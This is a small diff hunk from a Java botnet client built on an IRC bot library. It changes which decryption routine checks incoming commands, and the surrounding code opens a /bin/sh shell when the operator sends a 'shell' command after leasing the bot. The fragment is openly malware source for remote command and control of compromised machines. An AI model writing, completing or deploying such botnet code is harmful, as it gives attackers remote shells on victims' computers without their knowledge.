@@ -282,7 +282,7 @@ public class BotnetClient extends PircBot {
 							leasedM.genRSAPubKey(leasedPublicInfo);
 							chat.sendLine(m.encryptMsg("leased"));
 							chat.close();
-						} else if (m.decryptMsgNonce(command).startsWith("shell")) {
+						} else if (m.decryptMsg(command).startsWith("shell")) {
 							//Create the bash shell
 							Runtime r = Runtime.getRuntime();
 							Process p = r.exec("/bin/sh");
